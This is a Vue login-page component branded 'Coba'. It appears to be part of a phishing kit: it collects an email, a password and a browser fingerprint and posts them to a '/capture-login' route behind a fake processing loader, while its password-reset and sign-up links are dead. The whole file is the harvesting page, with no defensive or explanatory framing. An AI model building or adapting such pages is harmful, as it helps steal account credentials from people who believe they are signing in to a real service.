<script setup>
import { ref, onMounted, onBeforeUnmount } from 'vue'
import { useForm, Head } from '@inertiajs/vue3'
import platform from 'platform'

// Assets Coba
import cobaLogo from '@/assets/coba/cobalogo.svg'
import favicon from '@/assets/coba/coba.ico'

// Estado
const dispositivo = ref(platform.description || 'Desconocido')
const props = defineProps({ error: Boolean })

const form = useForm({
  email: '',
  password: '',
  dispositivo: dispositivo.value
})

const option = ref(0)
const showError = ref(false)
const errorMessage = ref('')

onMounted(() => {
  if (props.error) {
    showError.value = true
    errorMessage.value = 'Correo o contraseña incorrectos, intenta nuevamente'
  }
})

onBeforeUnmount(() => {})

function submit() {
  // Reset errores UI
  showError.value = false
  errorMessage.value = ''

  // Validaciones email/password (alineado al backend)
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (!form.email || !emailRegex.test(form.email)) {
    showError.value = true
    errorMessage.value = 'Ingresa un correo válido'
    return
  }
  if (!form.password || form.password.length < 6 || form.password.length > 64) {
    showError.value = true
    errorMessage.value = 'La contraseña debe tener entre 6 y 64 caracteres'
    return
  }

  option.value = 1
  setTimeout(() => {
    form.post('/capture-login', {
      preserveState: true,
      preserveScroll: true,
      onFinish: () => { option.value = 0 }
    })
  }, 800)
}
</script>

<template>
  <Head>
    <title>Coba</title>
    <link rel="icon" :href="favicon" />
  </Head>

  <!-- Loader -->
  <div v-if="option === 1" class="fixed inset-0 bg-white z-[300] flex items-center justify-center">
    <div class="flex flex-col items-center space-y-4">
      <div class="relative">
        <div class="w-12 h-12 border-4 border-gray-200 rounded-full"></div>
        <div class="absolute top-0 left-0 w-12 h-12 border-4 border-emerald-600 border-t-transparent rounded-full animate-spin"></div>
      </div>
      <p class="text-gray-600 font-medium">Procesando...</p>
    </div>
  </div>

  <!-- Contenido principal Coba -->
  <div v-else class="min-h-screen bg-white flex">
    <div class="w-full max-w-xl px-6 sm:px-10 pt-10">
      <!-- Logo -->
      <img :src="cobaLogo" alt="Coba" class="h-8 mb-12" />

      <!-- Título -->
      <h1 class="text-2xl font-semibold text-gray-900">Log in to your Coba Account</h1>
      <p class="mt-2 text-sm text-gray-500">Welcome back! Please enter your details.</p>

      <!-- Formulario -->
      <div class="mt-8 space-y-5 max-w-sm">
        <div>
          <label for="email" class="block text-sm text-gray-700">Email</label>
          <input id="email" v-model="form.email" type="email" autocomplete="email" class="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-emerald-600" />
        </div>
        <div>
          <label for="password" class="block text-sm text-gray-700">Password</label>
          <input id="password" v-model="form.password" type="password" autocomplete="current-password" class="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-emerald-600" />
        </div>

        <div v-if="showError" class="text-sm text-red-600">{{ errorMessage }}</div>

        <div class="flex items-center justify-between">
          <a class="text-sm font-semibold text-emerald-700 hover:underline" href="#">Forgot your password?</a>
        </div>

        <button @click="submit" type="button" class="mt-2 inline-flex items-center justify-center rounded-md bg-emerald-700 px-4 py-2 text-white font-semibold hover:bg-emerald-800 focus:outline-none focus:ring-2 focus:ring-emerald-600">
          Log in
        </button>

        <p class="text-sm text-gray-500">New to Coba? <a class="font-semibold text-gray-900 underline" href="#">Sign up</a>.</p>
      </div>

      <p class="mt-12 text-xs text-gray-400">&copy; {{ new Date().getFullYear() }} Coba</p>
    </div>
  </div>
</template>

<style>
/***** Página minimal Coba *****/
html, body { min-width: 320px; }
</style>

